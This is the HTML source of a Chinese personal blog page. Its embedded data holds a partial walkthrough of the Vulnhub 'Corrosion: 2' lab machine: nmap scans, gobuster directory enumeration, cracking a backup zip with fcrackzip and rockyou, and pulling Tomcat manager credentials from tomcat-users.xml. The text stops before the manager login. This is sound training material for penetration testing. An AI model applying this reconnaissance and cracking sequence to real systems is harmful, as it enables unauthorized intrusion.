<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-6fbfdb3e812309fb.js" defer=""></script><script src="/_next/static/mjZBuiwGkP0bnzupdQUa7/_buildManifest.js" defer=""></script><script src="/_next/static/mjZBuiwGkP0bnzupdQUa7/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnhubCorrosion 2","contentHtml":"\u003ch1\u003eCorrosion: 2\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://www.vulnhub.com/entry/corrosion-2,745/\"\u003ehttps://www.vulnhub.com/entry/corrosion-2,745/\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e提示：枚举才是神\u003c/p\u003e\n\u003ch2\u003e主机发现端口扫描\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e使用nmap扫描网段类存活主机\u003c/p\u003e\n\u003cp\u003e因为靶机是我最后添加的，所以靶机IP是\u003ccode\u003e6\u003c/code\u003e ，\u003ccode\u003ekali\u003c/code\u003e是\u003ccode\u003e10\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sP \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e\nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-11 21:50 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.1\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00048\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eA:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.2\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00040\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:E5:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003eB:\u003cspan class=\"hljs-number\"\u003e06\u003c/span\u003e (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.6\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00055\u003c/span\u003es latency).\nMAC Address: \u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eA:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003eA:\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003eB (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.10\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机开放端口\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sT -min-rate \u003cspan class=\"hljs-number\"\u003e10000\u003c/span\u003e -p- \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.6\u003c/span\u003e  \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-11 21:51 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.6\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00032\u003c/span\u003es latency).\nNot shown: \u003cspan class=\"hljs-number\"\u003e65532\u003c/span\u003e closed tcp \u003cspan class=\"hljs-title function_ invoke__\"\u003eports\u003c/span\u003e (conn-refused)\nPORT     STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   open  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   open  http\n\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e/tcp open  http-proxy\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描主机服务版本以及系统版本\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003enmap -sV -sT -O -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.6\u003c/span\u003e  \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https:\u003cspan class=\"hljs-comment\"\u003e//nmap.org ) at 2024-11-11 21:52 CST\u003c/span\u003e\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e56.6\u003c/span\u003e\nHost is \u003cspan class=\"hljs-title function_ invoke__\"\u003eup\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e0.00052\u003c/span\u003es latency).\n\nPORT     STATE SERVICE VERSION\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   open  ssh     OpenSSH \u003cspan class=\"hljs-number\"\u003e8.2\u003c/span\u003ep1 Ubuntu \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003eubuntu0.\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e (Ubuntu Linux; protocol \u003cspan class=\"hljs-number\"\u003e2.0\u003c/span\u003e)\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   open  http    Apache httpd \u003cspan class=\"hljs-number\"\u003e2.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e41\u003c/span\u003e ((Ubuntu))\n\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e/tcp open  http    Apache Tomcat \u003cspan class=\"hljs-number\"\u003e9.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e\nMAC Address: \u003cspan class=\"hljs-number\"\u003e08\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003eA:\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003eA:\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003eB (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e open \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e closed port\nDevice type: general purpose\nRunning: Linux \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e.X\nOS CPE: cpe:/o:linux:linux_kernel:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e\nOS details: Linux \u003cspan class=\"hljs-number\"\u003e5.0\u003c/span\u003e - \u003cspan class=\"hljs-number\"\u003e5.5\u003c/span\u003e\nNetwork Distance: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描漏洞\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enmap -script=vuln -p \u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e  \nStarting Nmap \u003cspan class=\"hljs-number\"\u003e7.94\u003c/span\u003eSVN ( https://nmap.org ) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\nHost \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e up (\u003cspan class=\"hljs-number\"\u003e0.00053\u003c/span\u003es latency).\n\nPORT     STATE SERVICE\n\u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  ssh\n\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e/tcp   \u003cspan class=\"hljs-built_in\"\u003eopen\u003c/span\u003e  http\n|_http-csrf: Couldn\u003cspan class=\"hljs-string\"\u003e't find any CSRF vulnerabilities.\n|_http-stored-xss: Couldn'\u003c/span\u003et find \u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n8080/tcp open  http-proxy\n| http-enum: \n|   /backup.zip: Possible backup\n|   /examples/: Sample scripts\n|   /manager/html/upload: Apache Tomcat (401 )\n|   /manager/html: Apache Tomcat (401 )\n|_  /docs/: Potentially interesting folder\nMAC Address: 08:00:27:0A:3A:6B (Oracle VirtualBox virtual NIC)\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003eweb渗透\u003c/h2\u003e\n\u003ch3\u003e80 端口\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问主页是\u003ccode\u003eApache\u003c/code\u003e默认页面\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e -w /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt -x php,html,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\n,txt\n===============================================================\nGobuster v3\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\n[+] Method:                  GET\n[+] Threads:                 \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt\n[+] Negative Status codes:   \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e\n[+] User Agent:              gobuster/\u003cspan class=\"hljs-number\"\u003e3.6\u003c/span\u003e\n[+] Extensions:              php,html,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\n/.html                (Status: \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e277\u003c/span\u003e]\n/index.html           (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e10918\u003c/span\u003e]\n/.html                (Status: \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e277\u003c/span\u003e]\n/server-status        (Status: \u003cspan class=\"hljs-number\"\u003e403\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e277\u003c/span\u003e]\nProgress: \u003cspan class=\"hljs-number\"\u003e1102800\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e1102805\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e100.00\u003c/span\u003e%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没扫描出什么，先放着\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e8080 端口\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e访问时\u003ccode\u003eTomcat\u003c/code\u003e的默认页面\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%202/image89.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e二话不说，扫目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003egobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e -w /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt -x php,html,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt                                                                 \u003cspan class=\"hljs-number\"\u003e22\u003c/span\u003e:05:\u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e [\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e161\u003c/span\u003e]\n===============================================================                                                                                                                                                   \nGobuster v3\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e                                                                                                                                                                                                     \nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)                                                                                                                                                     \n===============================================================                                                                                                                                                   \n[+] Url:                     http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e8080\u003c/span\u003e                                                                                                                                                             \n[+] Method:                  GET                                                                                                                                                                                  \n[+] Threads:                 \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e                                                                                                                                                                                   \n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-\u003cspan class=\"hljs-built_in\"\u003elist\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e2.3\u003c/span\u003e-medium.txt                                                                                                                         \n[+] Negative Status codes:   \u003cspan class=\"hljs-number\"\u003e404\u003c/span\u003e                                                                                                                                                                                  \n[+] User Agent:              gobuster/\u003cspan class=\"hljs-number\"\u003e3.6\u003c/span\u003e                                                                                                                                                                         \n[+] Extensions:              php,html,\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e,txt                                                                                                                                                                     \n[+] Timeout:                 10s                                                                                                                                                                                  \n===============================================================                                                                                                                                                   \nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode                                                                                                                                                                   \n===============================================================                                                                                                                                                   \n/docs                 (Status: \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e] [--\u003e /docs/]                                                                                                                                                        \n/examples             (Status: \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e] [--\u003e /examples/]                                                                                                                                                    \n/backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e           (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e33723\u003c/span\u003e]                                                                                                                                                                 \n/readme.txt           (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e153\u003c/span\u003e]                                                                                                                                                                   \n/manager              (Status: \u003cspan class=\"hljs-number\"\u003e302\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e] [--\u003e /manager/] \n/RELEASE-NOTES.txt    (Status: \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e) [Size: \u003cspan class=\"hljs-number\"\u003e6898\u003c/span\u003e]\nProgress: \u003cspan class=\"hljs-number\"\u003e1102800\u003c/span\u003e / \u003cspan class=\"hljs-number\"\u003e1102805\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e100.00\u003c/span\u003e%)                                                                    \n===============================================================                                                                                                                                                   \nFinished                                            \n=============================================================== \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我已经把\u003ccode\u003e404\u003c/code\u003e状态码的过滤了\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/docs\u003c/code\u003e 为\u003ccode\u003etomcat\u003c/code\u003e的文档\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/examples/\u003c/code\u003e是\u003ccode\u003etomcat\u003c/code\u003e例子\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/backup.zip\u003c/code\u003e 压缩包内容应该是备份的，解压需要密码\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003ereadme.txt\u003c/code\u003e 我以为是官方文档\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eHey randy! It\u003cspan class=\"hljs-string\"\u003e's your System Administrator. I left you a file on the server, I'\u003c/span\u003em sure nobody will find it.\nAlso remember to use that password I gave you.\n嘿，兰迪！我是你的系统管理员。我在服务器上给你留了一个文件，我相信没人能找到它。\n另外记得使用我给你的密码\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003e/manager\u003c/code\u003e 需要提供账号密码\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e暂时没什么线索，想尝试爆破出压缩包的密码\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e使用\u003ccode\u003efcrackzip\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ecrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\n\nPASSWORD FOUND!!!!: pw == @administrator_hi5\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e解出密码 \u003ccode\u003e@administrator_hi5\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e解压压缩包，输出破解出的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eunzip backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e -d backup  \nArchive:  backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\n[backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e] catalina.policy password: \n  inflating: backup/catalina.policy  \n  inflating: backup/context.xml      \n  inflating: backup/catalina.properties  \n  inflating: backup/jaspic-providers.xml  \n  inflating: backup/jaspic-providers.xsd  \n  inflating: backup/logging.properties  \n  inflating: backup/server.xml       \n  inflating: backup/tomcat-users.xml  \n  inflating: backup/tomcat-users.xsd  \n  inflating: backup/web.xml\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e解压后发现存在\u003ccode\u003etomcat-users.xml\u003c/code\u003e以及\u003ccode\u003etomcat-users.xsd\u003c/code\u003e ，配置tomcat用户及其角色，通常用于管理后台的访问权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u0026#x3C;role rolename=\u003cspan class=\"hljs-string\"\u003e\"manager-gui\"\u003c/span\u003e/\u003e\n\u0026#x3C;user username=\u003cspan class=\"hljs-string\"\u003e\"manager\"\u003c/span\u003e password=\u003cspan class=\"hljs-string\"\u003e\"melehifokivai\"\u003c/span\u003e roles=\u003cspan class=\"hljs-string\"\u003e\"manager-gui\"\u003c/span\u003e/\u003e\n\n\u0026#x3C;role rolename=\u003cspan class=\"hljs-string\"\u003e\"admin-gui\"\u003c/span\u003e/\u003e\n\u0026#x3C;user username=\u003cspan class=\"hljs-string\"\u003e\"admin\"\u003c/span\u003e password=\u003cspan class=\"hljs-string\"\u003e\"melehifokivai\"\u003c/span\u003e roles=\u003cspan class=\"hljs-string\"\u003e\"admin-gui, manager-gui\"\u003c/span\u003e/\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e的到密码\u003ccode\u003emelehifokivai\u003c/code\u003e ，两个用户名\u003ccode\u003eadmin\u003c/code\u003e和\u003ccode\u003emanager\u003c/code\u003e ，均尝试了\u003ccode\u003essh\u003c/code\u003e登录无果\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e访问\u003ccode\u003e/manager\u003c/code\u003e 